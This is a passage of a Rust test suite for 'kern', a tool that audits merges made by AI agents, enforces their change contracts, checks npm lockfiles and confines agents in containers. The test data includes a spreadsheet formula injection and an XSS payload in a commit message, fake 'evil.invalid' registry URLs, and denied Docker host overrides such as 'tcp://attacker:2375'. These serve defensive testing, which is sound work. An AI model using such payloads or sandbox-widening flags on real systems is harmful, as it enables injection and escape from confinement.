    sh(&repo, &["add", "-A"]);
    git_at(&repo, "2026-04-10T10:00:00Z", &["commit", "-qm", "Docs (#2)"]);
    let m2 = sh(&repo, &["rev-parse", "HEAD"]);
    std::fs::write(repo.join("src/other.mjs"), "export const other = 1;\n").unwrap();
    sh(&repo, &["add", "-A"]);
    git_at(&repo, "2026-04-15T10:00:00Z", &["commit", "-qm", "=cmd|' /C calc'!A0 <script>alert(1)</script>"]);
    let d1 = sh(&repo, &["rev-parse", "HEAD"]);
    let h3 = agent_change(&d1, "export const add = (a, b) => b + a;\n");
    sh(&repo, &["update-ref", "refs/remotes/pull/3/head", &h3]);
    let (run3, env3) = proof(&d1, &h3, &SigningKey::from_bytes(&random_bytes::<32>().unwrap()));
    let m3 = squash(&h3, &d1, "2026-04-20T10:00:00Z", "Kern: fix-addition (#3)");
    main(&m3);
    std::fs::write(repo.join(".github/kern/tasks/fix-addition.json"), serde_json::to_string_pretty(&policy_value()).unwrap()).unwrap();
    sh(&repo, &["add", "-A"]);
    git_at(&repo, "2026-05-01T10:00:00Z", &["commit", "-qm", "Tune the Kern task (#4)"]);
    let c1 = sh(&repo, &["rev-parse", "HEAD"]);
    let h5 = agent_change(&c1, "export const add = (a, b) => (a + b);\n");
    let (run5, env5) = proof(&c1, &h5, &f.key);
    let m5 = squash(&h5, &c1, "2026-05-10T10:00:00Z", "Kern: fix-addition (#5)");
    main(&m5);
    std::fs::write(repo.join("src/release.mjs"), "export const r = 1;\n").unwrap();
    sh(&repo, &["add", "-A"]);
    git_at(&repo, "2026-05-12T10:00:00Z", &["commit", "-qm", "Release fix (#6)"]);
    let r6 = sh(&repo, &["rev-parse", "HEAD"]);
    std::fs::write(repo.join("src/late.mjs"), "export const late = 1;\n").unwrap();
    sh(&repo, &["add", "-A"]);
    git_at(&repo, "2025-12-01T10:00:00Z", &["commit", "-qm", "Backdated push"]);
    let bd = sh(&repo, &["rev-parse", "HEAD"]);
    std::fs::write(repo.join("README.md"), "A fixture, documented twice\n").unwrap();
    sh(&repo, &["add", "-A"]);
    git_at(&repo, "2026-05-20T10:00:00Z", &["commit", "-qm", "Docs again (#7)"]);
    let m7 = sh(&repo, &["rev-parse", "HEAD"]);
    main(&m7);
    sh(&repo, &["reflog", "expire", "--expire=now", "--all"]);
    sh(&repo, &["gc", "-q", "--prune=now"]);
    assert!(Command::new("git").args(["cat-file", "-e", &h5]).current_dir(&repo).status().unwrap().code() != Some(0), "the head of PR 5 must be absent");

    let pr_into = |into: &str, n: u64, branch: &str, head: &str, base: &str, merged: &str, body: String| json!([{ "number": n, "title": format!("PR {n}"), "html_url": format!("https://github.com/acme/project/pull/{n}"),
        "merged_at": "2026-04-30T00:00:00Z", "merge_commit_sha": merged, "user": { "login": "dev" }, "head": { "ref": branch, "sha": head }, "base": { "ref": into, "sha": base }, "body": body }]);
    let pr = |n: u64, branch: &str, head: &str, base: &str, merged: &str, body: String| pr_into("audit-main", n, branch, head, base, merged, body);
    let body = |run_id: &str, head: &str, base: &str, envelope: &Value| promote::pr_body("fix-addition", &promote::Decision { repository: "acme/project".into(), branch: format!("kern/fix-addition/{run_id}"),
        base: base.into(), commit: head.into(), run_id: run_id.into(), attestation: Value::Null }, envelope, None).unwrap();
    let mut routes = std::collections::HashMap::new();
    routes.insert(format!("/repos/acme/project/commits/{m1}/pulls"), pr(1, &format!("kern/fix-addition/{run1}"), &h1, &setup, &m1, body(&run1, &h1, &setup, &env1)).to_string());
    routes.insert(format!("/repos/acme/project/commits/{m2}/pulls"), pr(2, "feature/docs", &m2, &m1, &m2, "Docs".into()).to_string());
    routes.insert(format!("/repos/acme/project/commits/{d1}/pulls"), "[]".into());
    routes.insert(format!("/repos/acme/project/commits/{m3}/pulls"), pr(3, &format!("kern/fix-addition/{run3}"), &h3, &d1, &m3, body(&run3, &h3, &d1, &env3)).to_string());
    routes.insert(format!("/repos/acme/project/commits/{c1}/pulls"), pr(4, "chore/kern", &c1, &m3, &c1, "Tune".into()).to_string());
    routes.insert(format!("/repos/acme/project/commits/{m5}/pulls"), pr(5, &format!("kern/fix-addition/{run5}"), &h5, &c1, &m5, body(&run5, &h5, &c1, &env5)).to_string());
    routes.insert(format!("/repos/acme/project/commits/{r6}/pulls"), pr_into("release", 6, "fix/release", &r6, &m5, &r6, "Release".into()).to_string());
    routes.insert(format!("/repos/acme/project/commits/{bd}/pulls"), "[]".into());
    routes.insert(format!("/repos/acme/project/commits/{m7}/pulls"), pr(7, "feature/more-docs", &m7, &bd, &m7, "More docs".into()).to_string());
    for (head, conclusion) in [(&h1, "success"), (&h3, "failure"), (&h5, "success")] {
        routes.insert(format!("/repos/acme/project/commits/{head}/check-runs"), json!({ "total_count": 1, "check_runs": [{ "name": "kern-verified", "conclusion": conclusion }] }).to_string());
    }
    let api = stub_api(move |method, path| {
        let route = path.split('?').next().unwrap_or(path);
        match (method, routes.get(route)) { ("GET", Some(reply)) => (200, reply.clone()), _ => (404, "{}".into()) }
    });
    let audit = |period: &str, key: Option<&Path>, name: &str| {
        let out = f.t.join(name);
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_kern"));
        cmd.arg("audit-merges").arg(&repo).arg("audit-main").arg(period).arg(&out);
        if let Some(k) = key { cmd.arg(k); }
        let done = cmd.env("GITHUB_API_URL", &api.url).env("GITHUB_TOKEN", "t0k").env("GITHUB_REPOSITORY", "acme/project").output().unwrap();
        (done.status.code(), out, String::from_utf8_lossy(&done.stderr).to_string())
    };

    let (code, out, err) = audit("2026-Q2", None, "q2");
    assert_eq!(code, Some(2), "a quarter with gaps fails: {err}");
    let report: Value = serde_json::from_str(&std::fs::read_to_string(out.join("report.json")).unwrap()).unwrap();
    let change = |sha: &str| report["changes"].as_array().unwrap().iter().find(|c| c["commit"] == sha).cloned().unwrap_or_else(|| panic!("{sha} missing: {report}"));
    assert_eq!(report["schema"], "kern-merge-audit/v1");
    assert_eq!(report["changes"].as_array().unwrap().len(), 9, "every change in the quarter, and nothing from before it: {report}");
    assert_eq!((report["history"]["first"].as_str(), report["history"]["last"].as_str(), report["history"]["tip"].as_str()), (Some(m1.as_str()), Some(m7.as_str()), Some(m7.as_str())), "{report}");
    let (v1, o2, p1, x3, g4, u5) = (change(&m1), change(&m2), change(&d1), change(&m3), change(&c1), change(&m5));
    let (r6, bd, o7) = (change(&r6), change(&bd), change(&m7));
    assert!(r6["category"] == "direct-push" && r6["gap"] == true && r6["reason"].as_str().unwrap().contains("audit-main"), "a pull request into another branch does not cover this one: {r6}");
    assert!(bd["category"] == "direct-push" && bd["flags"].as_array().unwrap().iter().any(|f| f == "backdated"), "{bd}");
    assert_eq!(o7["category"], "ordinary", "{o7}");
    assert_eq!((v1["category"].as_str(), v1["gap"].as_bool(), v1["proof"]["task"].as_str(), v1["proof"]["check_run"].as_str()), (Some("verified"), Some(false), Some("fix-addition"), Some("success")), "{v1}");
    assert!(v1["proof"]["checks"].as_array().unwrap().iter().any(|c| c == "capabilities"), "{v1}");
    assert_eq!((o2["category"].as_str(), o2["gap"].as_bool()), (Some("ordinary"), Some(false)), "{o2}");
    assert_eq!((p1["category"].as_str(), p1["gap"].as_bool()), (Some("direct-push"), Some(true)), "{p1}");
    assert!(x3["category"] == "invalid-proof" && x3["gap"] == true && x3["reason"].as_str().unwrap().contains("Untrusted signing key"), "{x3}");
    assert!(g4["category"] == "ordinary" && g4["flags"].as_array().unwrap().iter().any(|f| f == "gate-config"), "{g4}");
    assert!(u5["category"] == "unverifiable" && u5["gap"] == true && u5["reason"].as_str().unwrap().contains("git fetch"), "{u5}");
    let s = &report["summary"];
    assert_eq!((s["status"].as_str(), s["changes"].as_u64(), s["verified"].as_u64(), s["gaps"].as_u64(), s["gate_config_changes"].as_u64(), s["date_anomalies"].as_u64()), (Some("GAPS"), Some(9), Some(1), Some(5), Some(1), Some(1)), "{s}");
    let statement = report["statement"].as_str().unwrap();
    assert!(statement.contains("not what the agent did while writing it") && !statement.contains("protected"), "{report}");
    assert!(report["controls"].as_array().unwrap().iter().any(|c| c["control"].as_str().unwrap().contains("CC8.1")), "{report}");
    let html = std::fs::read_to_string(out.join("report.html")).unwrap();
    assert!(html.contains("&lt;script&gt;") && !html.contains("<script>alert"), "agent and author text is escaped in the dashboard");
    let csv = std::fs::read_to_string(out.join("report.csv")).unwrap();
    assert_eq!(csv.lines().count(), 10, "{csv}");
    assert!(csv.lines().any(|l| l.contains("\"'=cmd|")), "spreadsheet formulas in commit subjects are neutralised: {csv}");
    let (code, out, err) = audit("2026-04-01..2026-04-05", None, "early");
    assert_eq!(code, Some(0), "{err}");
    assert_eq!(serde_json::from_str::<Value>(&std::fs::read_to_string(out.join("report.json")).unwrap()).unwrap()["summary"]["status"], "COVERED");
    std::fs::write(f.t.join("auditor.pub"), attest::keypair().unwrap().1).unwrap();
    let (code, out, _) = audit("2026-04-01..2026-04-05", Some(&f.t.join("auditor.pub")), "own-key");
    assert_eq!(code, Some(2));
    let own: Value = serde_json::from_str(&std::fs::read_to_string(out.join("report.json")).unwrap()).unwrap();
    assert!(own["changes"][0]["category"] == "invalid-proof" && own["trusted_key"].as_str().unwrap().contains("supplied"), "{own}");
    let path = repo.display().to_string().replace('\\', "/");
    sh(&f.t.0, &["clone", "-q", "--depth", "1", &if path.starts_with('/') { format!("file://{path}") } else { format!("file:///{path}") }, "shallow"]);
    let shallow = Command::new(env!("CARGO_BIN_EXE_kern")).arg("audit-merges").arg(f.t.join("shallow")).arg("HEAD").arg("2026-Q2").arg(f.t.join("shallow-out"))
        .env("GITHUB_API_URL", &api.url).env("GITHUB_TOKEN", "t0k").env("GITHUB_REPOSITORY", "acme/project").output().unwrap();
    assert!(shallow.status.code() == Some(1) && String::from_utf8_lossy(&shallow.stderr).contains("shallow"), "{shallow:?}");
    sh(&f.t.0, &["clone", "-q", &if path.starts_with('/') { format!("file://{path}") } else { format!("file:///{path}") }, "partial"]);
    sh(&f.t.join("partial"), &["config", "remote.origin.promisor", "true"]);
    sh(&f.t.join("partial"), &["config", "remote.origin.partialclonefilter", "blob:none"]);
    let partial = Command::new(env!("CARGO_BIN_EXE_kern")).arg("audit-merges").arg(f.t.join("partial")).arg("HEAD").arg("2026-Q2").arg(f.t.join("partial-out"))
        .env("GITHUB_API_URL", &api.url).env("GITHUB_TOKEN", "t0k").env("GITHUB_REPOSITORY", "acme/project").output().unwrap();
    assert!(partial.status.code() == Some(1) && String::from_utf8_lossy(&partial.stderr).contains("partial clone"), "{partial:?}");
    denied(kern::merges::period("2026-Q5"), "period");
    assert_eq!(kern::merges::period("2026-Q1").unwrap(), ("2026-01-01".to_string(), "2026-03-31".to_string()));
    assert_eq!(kern::merges::period("2026-02-01..2026-02-28").unwrap(), ("2026-02-01".to_string(), "2026-02-28".to_string()));
}

#[test]
fn ingest_accepts_external_agent_commits_only_within_the_contract() {
    let t = Temp::new();
    let source = t.join("source");
    sh(&t.0, &["init", "-q", "source"]);
    sh(&source, &["config", "core.autocrlf", "false"]);
    std::fs::create_dir_all(source.join("src")).unwrap();
    std::fs::write(source.join("src/add.mjs"), "export const add = (a, b) => a - b;\n").unwrap();
    std::fs::write(source.join("README.md"), "x\n").unwrap();
    sh(&source, &["add", "-A"]);
    sh(&source, &["commit", "-qm", "base"]);
    let base = sh(&source, &["rev-parse", "HEAD"]);
    sh(&t.0, &["clone", "-q", "source", "agent"]);
    let agent = t.join("agent");
    sh(&agent, &["config", "core.autocrlf", "false"]);
    std::fs::write(agent.join("src/add.mjs"), "export const add = (a, b) => a + b;\n").unwrap();
    sh(&agent, &["commit", "-qam", "agent fix"]);
    let good = sh(&agent, &["rev-parse", "HEAD"]);
    std::fs::write(agent.join("README.md"), "agent rewrote docs\n").unwrap();
    sh(&agent, &["commit", "-qam", "agent overreach"]);
    let bad = sh(&agent, &["rev-parse", "HEAD"]);
    std::fs::write(t.join("contract.json"), policy_value().to_string()).unwrap();
    std::fs::write(t.join("operator.json"), operator_value(&["external"]).to_string()).unwrap();
    std::fs::create_dir(t.join("keys")).unwrap();
    std::fs::write(t.join("keys/public.pem"), attest::keypair().unwrap().1).unwrap();
    std::fs::write(t.join("job.json"), json!({ "version": 3, "repo": "source", "base": base, "contract": "contract.json", "operator": "operator.json", "command": null, "verification_key": "keys/public.pem", "output": "tasks" }).to_string()).unwrap();
    let mut inside = policy::job(&t.join("job.json")).unwrap();
    inside.output = t.join("keys/tasks");
    assert_eq!(flow::task(&inside, flow::Source::Ingest(&agent, &good)).unwrap()["status"], "BLOCKED");
    assert!(!t.join("keys/tasks").exists());
    let job = policy::job(&t.join("job.json")).unwrap();
    let r = flow::task(&job, flow::Source::Ingest(&agent, &good)).unwrap();
    assert_eq!(r["status"], "CANDIDATE", "{r}");
    assert_eq!(r["executor"], "external");
    let bundle = PathBuf::from(r["bundle"].as_str().unwrap());
    assert!(std::fs::read_to_string(bundle.join("changes.patch")).unwrap().contains("+export const add = (a, b) => a + b;"));
    let imported = git::import_handoff(&bundle.join("handoff"), &t.join("verifier-run")).unwrap();
    assert_eq!(imported["commit"], r["commit"]);
    let blocked = flow::task(&job, flow::Source::Ingest(&agent, &bad)).unwrap();
    assert_eq!(blocked["status"], "BLOCKED");
    assert!(blocked["reason"].as_str().unwrap().contains("outside contract"));
    assert_eq!((blocked["feedback"]["schema"].as_str(), blocked["feedback"]["violations"][0]["rule"].as_str()), (Some("kern-feedback/v1"), Some("scope")), "{blocked}");
}
#[test]
fn lockfiles_must_pin_every_package_to_the_registry_with_integrity() {
    let lock = |pkgs: Value| -> Files { [("package.json".to_string(), file("{}")), ("package-lock.json".to_string(), file(&json!({ "lockfileVersion": 3, "packages": pkgs }).to_string()))].into_iter().collect() };
    let ok = json!({ "": {}, "node_modules/a": { "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz", "integrity": "sha512-x" }, "node_modules/a/node_modules/b": { "inBundle": true } });
    assert_eq!(flow::validate_lockfile(&lock(ok), "registry.npmjs.org").unwrap()["sha1_only"], 0);
    let legacy = flow::validate_lockfile(&lock(json!({ "node_modules/a": { "resolved": "https://registry.npmjs.org/a.tgz", "integrity": "sha1-abc" } })), "registry.npmjs.org").unwrap();
    assert_eq!((legacy["packages"].as_u64(), legacy["sha1_only"].as_u64()), (Some(1), Some(1)));
    flow::validate_lockfile(&lock(json!({ "node_modules/a": { "resolved": "http://registry.npmjs.org/a.tgz", "integrity": "sha512-x" } })), "registry.npmjs.org").unwrap();
    denied(flow::validate_lockfile(&lock(json!({ "node_modules/a": { "resolved": "https://evil.invalid/a.tgz", "integrity": "sha512-x" } })), "registry.npmjs.org"), "does not resolve");
    denied(flow::validate_lockfile(&lock(json!({ "node_modules/a": { "resolved": "https://registry.npmjs.org.evil.invalid/a.tgz", "integrity": "sha512-x" } })), "registry.npmjs.org"), "does not resolve");
    denied(flow::validate_lockfile(&lock(json!({ "node_modules/a": { "resolved": "https://registry.npmjs.org/a.tgz", "integrity": "md5-x" } })), "registry.npmjs.org"), "standard integrity");
    denied(flow::validate_lockfile(&lock(json!({ "node_modules/a": { "link": true } })), "registry.npmjs.org"), "Linked");
    denied(flow::validate_lockfile(&lock(json!({ "node_modules/a": { "resolved": "https://registry.npmjs.org/a.tgz" } })), "registry.npmjs.org"), "standard integrity");
    denied(flow::validate_lockfile(&files(&[("package.json", "{}")]), "registry.npmjs.org"), "package-lock.json");
}
#[test]
fn docker_and_container_configuration_cannot_be_widened() {
    let t = Temp::new();
    let tool = t.join("tool");
    std::fs::write(&tool, "pinned-tool-fixture").unwrap();
    let p = json!({ "file": tool, "sha256": sha256(std::fs::read(&tool).unwrap()) });
    let control = json!({ "version": 1, "role": "executor", "docker": { "file": p["file"], "sha256": p["sha256"], "endpoint": policy::ENDPOINT }, "git": p, "host_policy": p,
        "runtime": { "file": "/usr/local/bin/runsc", "sha256": "a".repeat(64), "version": "fixture", "arguments": [] } });
    let c = policy::validate_control(&control).unwrap();
    let (_, args, env) = sandbox::docker_invocation(&c, &["info"], &[], Path::new("/fresh")).unwrap();
    assert_eq!(args[..4], ["--config", "/fresh", "--host", policy::ENDPOINT]);
    assert!(env.iter().any(|(k, v)| k == "PATH" && v.is_empty()) && !env.iter().any(|(k, _)| k == "DOCKER_HOST" || k == "HTTP_PROXY"));
    for flag in ["--host=tcp://evil", "--context=x", "-Htcp://evil", "--config", "--tls"] { denied(sandbox::docker_invocation(&c, &["info", flag], &[], Path::new("/x")), "overrides"); }
    let check = ["__exec", "/bin/sh", "-c", "npm test -- --config ci.json"];
    let (_, args, _) = sandbox::docker_invocation(&c, &["create", "--name", "kern-x", "sha256:x"], &check, Path::new("/x")).unwrap();
    assert_eq!(args[args.len() - 5..], ["sha256:x", "__exec", "/bin/sh", "-c", "npm test -- --config ci.json"]);
    denied(sandbox::docker_invocation(&c, &["create", "--host=tcp://evil", "sha256:x"], &check, Path::new("/x")), "overrides");
    let mut remote = control.clone();
    remote["docker"]["endpoint"] = json!("tcp://attacker:2375");
    denied(policy::validate_control(&remote), "fixed local Docker socket");
    let mut args_runtime = control.clone();
    args_runtime["runtime"]["arguments"] = json!(["--platform=ptrace"]);
    denied(policy::validate_control(&args_runtime), "default runsc arguments");
    std::fs::write(&tool, "changed").unwrap();
    denied(sandbox::docker_invocation(&c, &["info"], &[], Path::new("/x")), "changed");
    let limits = contract(&policy_value()).unwrap().limits;
    let write = vec!["src/".to_string()];
    let spec = Spec { image: "sha256:x", snapshot: &t.0, control: &t.0, writable: &write, limits: &limits, entry: vec!["__runner".into()], network: "none", volumes: vec![], root: false, home_mb: 0, scratch: false, workspace: None };
    let a = sandbox::container_args(&spec, "kern-x").unwrap().join(" ");
    for want in ["--runtime=runsc", "--network=none", "--read-only", "--user=1000:1000", "--cap-drop=ALL", "no-new-privileges", "--pull=never", "--entrypoint=/kern/kern"] { assert!(a.contains(want), "{want}"); }
    assert!(!a.contains("docker.sock") && a.matches("type=bind").count() == 3 && a.matches(",readonly").count() == 3);
    let planting = Spec { image: "sha256:x", snapshot: &t.0, control: &t.0, writable: &[], limits: &limits, entry: vec!["__mutate".into()], network: "none", volumes: vec![], root: false, home_mb: 0, scratch: true, workspace: None };
    let s = sandbox::container_args(&planting, "kern-x").unwrap().join(" ");
    assert!(s.contains("--tmpfs /workspace:rw,nosuid,nodev") && s.matches("type=bind").count() == 2 && s.matches(",readonly").count() == 2 && !s.contains("target=/workspace,"), "{s}");
    denied(sandbox::container_args(&Spec { writable: &write, ..planting }, "kern-x"), "scratch");
    denied(sandbox::container_args(&Spec { network: "bridge", ..spec }, "kern-x"), "Only dependency setup");
    let deps = vec![("kern-deps-1", "/workspace/node_modules", true)];
    let tests = Spec { image: "sha256:x", snapshot: &t.0, control: &t.0, writable: &[], limits: &limits, entry: vec!["__exec".into(), "/usr/local/bin/node".into()], network: "none", volumes: deps.clone(), root: false, home_mb: 0, scratch: true, workspace: None };
    let s = sandbox::container_args(&tests, "kern-x").unwrap().join(" ");
    assert!(s.contains("--tmpfs /workspace:rw,nosuid,nodev") && !s.contains("target=/workspace,") && s.contains("type=volume,source=kern-deps-1,target=/workspace/node_modules,readonly"), "{s}");
    for dir in [".cache", ".vite", ".vite-temp"] { assert!(s.contains(&format!("--tmpfs /workspace/node_modules/{dir}:rw,nosuid,nodev")), "{dir}: {s}"); }
    for entry in ["__exec", "__mutate"] {
        denied(sandbox::container_args(&Spec { entry: vec![entry.into()], scratch: false, volumes: deps.clone(), ..tests }, "kern-x"), "copy of the workspace");
    }
    let setup = Spec { image: "sha256:x", snapshot: &t.0, control: &t.0, writable: &[], limits: &limits, entry: vec!["__setup".into()], network: "bridge", volumes: vec![("kern-deps-1", "/workspace/node_modules", false)], root: true, home_mb: 1024, scratch: false, workspace: None };
    assert!(!sandbox::container_args(&setup, "kern-x").unwrap().join(" ").contains("node_modules/."), "the install itself writes the volume directly");
}

const NODE: &str = "docker.io/library/node:22-bookworm-slim@sha256:c3de60bf2f9dd0ac6370e6117950ff62d6e339527e7472301c9c78a017978392";
const IMAGE_ENV: [&str; 2] = ["PATH=/usr/local/bin:/usr/bin:/bin", "NODE_VERSION=22.23.3"];
#[test]
fn drive_runs_read_an_installed_tree_with_the_network_off() {
    let t = Temp::new();
    let limits = contract(&policy_value()).unwrap().limits;
    let tools = vec![("kern-deps-tools", "/kern-tools/node_modules", true)];
    let run = Spec { image: "sha256:x", snapshot: &t.0, control: &t.0, writable: &[], limits: &limits, entry: vec!["__drive".into()], network: "none", volumes: tools.clone(), root: false, home_mb: 0, scratch: false, workspace: Some(("kern-deps-tree", true)) };
    let a = sandbox::container_args(&run, "kern-x").unwrap().join(" ");
    for want in ["type=volume,source=kern-deps-tree,target=/workspace,readonly", "type=volume,source=kern-deps-tools,target=/kern-tools/node_modules,readonly", "--network=none", "--user=1000:1000", "--runtime=runsc", "--read-only"] {
        assert!(a.contains(want), "{want}: {a}");
    }
    assert!(a.matches("type=bind").count() == 2 && a.matches("target=/input,readonly").count() == 1 && a.matches("target=/kern,readonly").count() == 1, "only /input and /kern are bound: {a}");
    for dir in [".cache", ".vite", ".vite-temp"] { assert!(a.contains(&format!("--tmpfs /workspace/node_modules/{dir}:rw,nosuid,nodev")), "{dir}: {a}"); }
    assert!(!a.contains("/kern-tools/node_modules/."), "{a}");
    let write = vec!["src/".to_string()];
    denied(sandbox::container_args(&Spec { network: "bridge", ..run.clone() }, "kern-x"), "network");
    for bad in [Spec { root: true, ..run.clone() }, Spec { writable: &write, ..run.clone() }, Spec { workspace: Some(("kern-deps-tree", false)), ..run.clone() }, Spec { workspace: None, ..run.clone() }, Spec { scratch: true, ..run.clone() }] {
        denied(sandbox::container_args(&bad, "kern-x"), "drive run");
    }
    denied(sandbox::container_args(&Spec { workspace: Some(("my-volume", true)), ..run.clone() }, "kern-x"), "tree volume");
    denied(sandbox::container_args(&Spec { volumes: vec![("kern-deps-tools", "/kern-tools/node_modules", false)], ..run.clone() }, "kern-x"), "Unexpected volume");
    denied(sandbox::container_args(&Spec { volumes: vec![("kern-deps-tools", "/opt/tools", true)], ..run.clone() }, "kern-x"), "Unexpected volume");
    let tests = Spec { entry: vec!["__exec".into(), "/usr/local/bin/node".into()], scratch: true, workspace: None, ..run.clone() };
    denied(sandbox::container_args(&tests, "kern-x"), "Unexpected volume");
    for entry in ["__runner", "__setup", "__mutate"] {
        denied(sandbox::container_args(&Spec { entry: vec![entry.into()], volumes: vec![], ..run.clone() }, "kern-x"), "tree volume");
    }
    let setup = Spec { entry: vec!["__drive_setup".into()], network: "bridge", root: true, home_mb: 1024, volumes: vec![], workspace: Some(("kern-deps-tree", false)), ..run.clone() };
    let s = sandbox::container_args(&setup, "kern-x").unwrap().join(" ");
    assert!(s.contains("type=volume,source=kern-deps-tree,target=/workspace ") && s.contains("--network=bridge") && !s.contains("/workspace/node_modules/."), "{s}");
    let cpus = std::thread::available_parallelism().map_or(1, |n| n.get()).clamp(1, 4);
    assert!(s.contains(&format!("--cpus={cpus}")) && a.contains("--cpus=1"), "{s}");
    assert!(s.contains("--ulimit nofile=65536:65536") && a.contains("--ulimit nofile=65536:65536"), "{a}");
    let runner = Spec { entry: vec!["__runner".into()], volumes: vec![], workspace: None, ..run.clone() };
    assert!(sandbox::container_args(&runner, "kern-x").unwrap().join(" ").contains("--ulimit nofile=1024:1024"));
    for bad in [Spec { volumes: tools.clone(), ..setup.clone() }, Spec { network: "none", ..setup.clone() }, Spec { root: false, ..setup.clone() }, Spec { workspace: Some(("kern-deps-tree", true)), ..setup.clone() }, Spec { workspace: None, ..setup.clone() }] {
        assert!(sandbox::container_args(&bad, "kern-x").is_err(), "{:?}", bad.entry);
    }
}
fn docker_info() -> Value {
    json!({ "OSType": "linux", "OperatingSystem": "Docker Desktop", "ServerVersion": "29.8.1", "KernelVersion": "5.15.167.4-microsoft-standard-WSL2",
        "SecurityOptions": ["name=seccomp,profile=builtin"], "MemoryLimit": true, "SwapLimit": true, "PidsLimit": true, "Runtimes": { "runc": {} } })
}
fn podman_info(controllers: &[&str]) -> Value {
    json!({ "host": { "os": "linux", "cgroupControllers": controllers, "security": { "rootless": true, "capabilities": "CAP_CHOWN,CAP_KILL", "seccompEnabled": true, "selinuxEnabled": false } },
        "version": { "Version": "4.9.3" } })
}
fn engine_of(info: &Value) -> container::Engine { container::engine_from_info(Path::new("/usr/bin/docker"), info).unwrap() }
fn box_spec<'a>(ws: &'a Path, command: &'a [String], mounts: &'a [container::Mount], env: &'a [String], network: bool) -> container::BoxSpec<'a> {
    container::BoxSpec { image: NODE, command, workspace: ws, mounts, env, network, timeout_seconds: 30, memory_mb: 256, pids: 64, feedback: None, delta: None }
}

#[test]
fn container_engines_are_recognised_from_docker_and_podman_info() {
    let d = engine_of(&docker_info());
    assert!(!d.podman && !d.rootless && !d.gvisor && !d.selinux && !d.desktop_vm && d.name == "Docker 29.8.1 (Docker Desktop)", "{d:?}");
    d.usable().unwrap();
    let mut info = docker_info();
    info["Runtimes"]["runsc"] = json!({});
    info["SecurityOptions"] = json!(["name=seccomp,profile=builtin", "name=rootless", "name=selinux"]);
    let g = engine_of(&info);
    assert!(g.gvisor && g.rootless && g.selinux && g.isolation() == "gVisor");
    info["OSType"] = json!("windows");
    denied(container::engine_from_info(Path::new("docker"), &info), "Linux containers");
    let mut vm = docker_info();
    vm["KernelVersion"] = json!("6.10.14-linuxkit");
    assert!(engine_of(&vm).desktop_vm);
    let mut swap = docker_info();
    swap["SwapLimit"] = json!(false);
    denied(engine_of(&swap).usable(), "memory and process limits");
    let mut open = docker_info();
    open["SecurityOptions"] = json!(["name=seccomp,profile=unconfined"]);
    denied(engine_of(&open).usable(), "seccomp");
    open["Runtimes"]["runsc"] = json!({});
    engine_of(&open).usable().unwrap();
    let p = engine_of(&podman_info(&["cpu", "memory", "pids"]));
    assert!(p.podman && p.rootless && p.name == "Podman 4.9.3" && p.default_caps == ["CAP_CHOWN", "CAP_KILL"], "{p:?}");
    p.usable().unwrap();
    denied(engine_of(&podman_info(&[])).usable(), "memory and process limits");
    let mut unconfined = podman_info(&["memory", "pids"]);
    unconfined["host"]["security"]["seccompEnabled"] = json!(false);
    denied(engine_of(&unconfined).usable(), "seccomp");
    #[cfg(target_os = "linux")]
    assert_eq!(container::identity(&engine_of(&vm)).0, "0:0", "Docker Desktop's VM shares files as root, so the agent runs as root there");
}

#[test]
fn container_box_arguments_confine_the_agent() {
    let t = Temp::new();
    let command = vec!["/usr/local/bin/node".to_string(), "--agent-flag".into(), "--network=host".into()];
    let mounts = vec![container::Mount { source: t.join("tool"), target: "/opt/tool".into() }];
    let env = vec!["AGENT_TOKEN".to_string()];
    let e = engine_of(&docker_info());
    let a = container::create_args(&box_spec(&t.0, &command, &mounts, &env, false), &e, "kern-box-1-x").unwrap();
    for want in ["create", "--name=kern-box-1-x", "--label=kern.box=kern-box-1-x", "--read-only", "--network=none", "--cap-drop=ALL", "--security-opt=no-new-privileges", "--pids-limit=64",
                 "--memory=256m", "--memory-swap=256m", "--ipc=private", "--pull=never", "--log-driver=none", "--workdir=/workspace", "--entrypoint=/usr/local/bin/node", "--env=HOME=/home/kern", "--env=AGENT_TOKEN"] {
        assert!(a.iter().any(|x| x == want), "{want} missing from {a:?}");
    }
    assert!(a.contains(&format!("--user={}", container::identity(&e).0)), "{a:?}");
    let tmpfs: Vec<&String> = a.iter().filter(|x| x.starts_with("--tmpfs=")).collect();
    assert!(tmpfs.len() == 2 && tmpfs.iter().all(|x| x.contains(",exec,") && !x.contains("noexec")), "every engine gets the same exec setting: {tmpfs:?}");
    let image = a.iter().position(|x| x == NODE).unwrap();
    assert_eq!(a[image + 1..], command[1..], "the agent's own flags follow the image, where the engine parses no options");
    let binds: Vec<&String> = a.iter().filter(|x| x.starts_with("--mount=")).collect();
    assert_eq!(binds.len(), 2, "{a:?}");
    assert!(binds[0].starts_with("--mount=type=bind,source=") && binds[0].ends_with(",target=/workspace"), "{}", binds[0]);
    assert!(binds[1].ends_with(",target=/opt/tool,readonly"), "{}", binds[1]);
    assert!(!a[..image].iter().any(|x| x.starts_with("--runtime") || x == "--privileged" || x.starts_with("--network=host") || x.contains("docker.sock") || x.starts_with("--http-proxy")), "{a:?}");
    let open = container::create_args(&box_spec(&t.0, &command, &mounts, &env, true), &e, "kern-box-1-x").unwrap();
    let image = open.iter().position(|x| x == NODE).unwrap();
    assert!(!open[..image].iter().any(|x| x.starts_with("--network")), "granted network is the engine's default network, never the host's");
    let mut g = e.clone();
    g.gvisor = true;
    assert!(container::create_args(&box_spec(&t.0, &command, &mounts, &env, false), &g, "kern-box-1-x").unwrap().contains(&"--runtime=runsc".to_string()));
    denied(container::create_args(&box_spec(&t.join("a,b"), &command, &mounts, &env, false), &e, "kern-box-1-x"), "comma");
    let p = engine_of(&podman_info(&["memory", "pids"]));
    let pa = container::create_args(&box_spec(&t.0, &command, &mounts, &env, false), &p, "kern-box-1-x").unwrap();
    assert!(pa.contains(&"--http-proxy=false".to_string()) && pa.contains(&"--memory-swap=256m".to_string()), "{pa:?}");
    assert!(pa.iter().any(|x| x.starts_with("--tmpfs=/home/kern:") && x.ends_with(",U")), "{pa:?}");
    let mut ps = p.clone();
    ps.selinux = true;
    let sa = container::create_args(&box_spec(&t.0, &command, &mounts, &env, false), &ps, "kern-box-1-x").unwrap();
    assert!(sa.iter().any(|x| x.starts_with("--mount=type=bind,") && x.ends_with(",target=/workspace,relabel=private")), "{sa:?}");
    assert!(sa.iter().any(|x| x.ends_with(",target=/opt/tool,readonly")), "{sa:?}");
    #[cfg(unix)]
    {
        let mut ds = e.clone();
        ds.selinux = true;
        let da = container::create_args(&box_spec(&t.0, &command, &mounts, &env, false), &ds, "kern-box-1-x").unwrap();
